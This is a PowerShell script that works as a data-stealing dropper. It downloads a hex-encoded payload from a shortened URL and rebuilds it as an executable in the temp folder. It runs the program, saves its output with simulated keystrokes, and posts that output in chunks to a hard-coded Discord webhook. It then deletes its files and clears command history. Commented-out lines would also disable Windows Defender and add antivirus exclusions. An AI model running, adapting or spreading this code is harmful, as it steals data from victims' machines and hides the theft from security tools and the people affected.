# # FIRST THINGS FIRST

# # Disable Windows Defender Real-time Protection
# Set-MpPreference -DisableRealtimeMonitoring $true

# If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
#   Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
#   Exit	
# }



# # Check if running with Administrator privileges
# If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
#     # Relaunch PowerShell as administrator
#     $arguments = "& '" + $myinvocation.MyCommand.Definition + "'"
#     Start-Process powershell -Verb runAs -ArgumentList $arguments
#     Exit
# }

# # Load Windows Forms assembly
# Add-Type -AssemblyName 'System.Windows.Forms'

# # Give some time for the window to be in focus (if necessary)
# Start-Sleep -Seconds 6

# # Send Alt+Y
# [System.Windows.Forms.SendKeys]::SendWait('%y')



# # If script reaches here, it is running with Administrator privileges
# Write-Host "This script is running with Administrator privileges."

# Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"

# Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
# ##############################################################################



# Define the URL of the file to be downloaded
$url = "https://lnkfwd.com/u/Kpj_Yric"  # Replace with your file URL

# Define the path to save the file in the %temp% folder
$tempPath = [System.IO.Path]::Combine($env:TEMP, "example.txt")  # Replace "downloaded_file.zip" with your desired filename

# Use Invoke-WebRequest to download the file
Invoke-WebRequest -Uri $url -OutFile $tempPath

# Output the location of the downloaded file
#Write-Host "File downloaded to: $tempPath"

###############################################################################

#i open the app byconverting the hex to ek and run in the memory

# Path to the hex file in the %temp% directory
$hexFilePath = Join-Path $env:TEMP "example.txt"

# Read the hex string from the file
$hexString = Get-Content -Path $hexFilePath -Raw

# Convert the hex string to a byte array
$bytes = [byte[]]::new($hexString.Length / 2)
for ($i = 0; $i -lt $hexString.Length; $i += 2) {
    $bytes[$i / 2] = [convert]::ToByte($hexString.Substring($i, 2), 16)
}

# Create a temporary file to hold the executable
$tempExePath = Join-Path $env:TEMP "example.exe"
[System.IO.File]::WriteAllBytes($tempExePath, $bytes)


##########################################################################

# Start the executable
$process = Start-Process $tempExePath

$outputFilePath = "$env:TEMP\data.txt"

# Wait a moment for the application to fully load
Start-Sleep -Seconds 2

# Load the necessary assemblies for sending keys
Add-Type -AssemblyName System.Windows.Forms

# Simulate CTRL+A and then CTRL+S to save the file
[System.Windows.Forms.SendKeys]::SendWait("^(a)")  # Simulate CTRL+A
Start-Sleep -Milliseconds 500  # Wait a moment for selection
[System.Windows.Forms.SendKeys]::SendWait("^(s)")  # Simulate CTRL+S
Start-Sleep -Milliseconds 500  # Wait for save dialog to appear

# Send the output file path and Enter
[System.Windows.Forms.SendKeys]::SendWait("$outputFilePath")
Start-Sleep -Milliseconds 500  # Wait for the input
[System.Windows.Forms.SendKeys]::SendWait("{ENTER}")  # Press Enter to save

# Wait a moment for the file to save
Start-Sleep -Seconds 2

# Close the application
#Stop-Process -Id $process.Id -Force

# Cleanup any lingering processes
Get-Process | Where-Object { $_.Path -like "$env:TEMP\example.exe" } | Stop-Process -Force

# Inform the user that the script is complete
#Write-Host "Process completed and all instances closed."




######################################################################################

# Define the webhook URL
$webhookUrl='https://discord.com/api/webhooks/1297470837779333141/8AHSJu020L0KTuKxTcsMP5gaUQoy8M1IIX_1ts-DAsvj8748RNmEm0N9Xoxk-vy-_Gh-'

# Define the path to the text file using the TEMP environment variable
$filePath = "$env:TEMP\data.txt"

# Check if the file exists
if (Test-Path $filePath) {
    # Read the content of the text file
    $fileContent = Get-Content -Path $filePath -Raw

    # Split the content into chunks of 2000 characters
    $chunkSize = 2000
    $chunks = [System.Collections.Generic.List[string]]::new()

    for ($i = 0; $i -lt $fileContent.Length; $i += $chunkSize) {
        $chunks.Add($fileContent.Substring($i, [math]::Min($chunkSize, $fileContent.Length - $i)))
    }

    # Send each chunk to the Discord webhook
    foreach ($chunk in $chunks) {
        # Create the payload for the webhook
        $payload = @{
            content = $chunk
        } | ConvertTo-Json

        # Try to send the content to the Discord webhook
        try {
            Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
            Start-Sleep -Seconds 1  # Optional: Pause briefly to avoid rate limits
        } catch {
            #Write-Host "Error sending request: $_"
        }
    }
} else {
    #Write-Host "File not found: $filePath"
}


Remove-Item "$env:TEMP\data.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\example.txt" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TEMP\example.exe" -Force -ErrorAction SilentlyContinue

# Clear the PowerShell command history
Clear-History
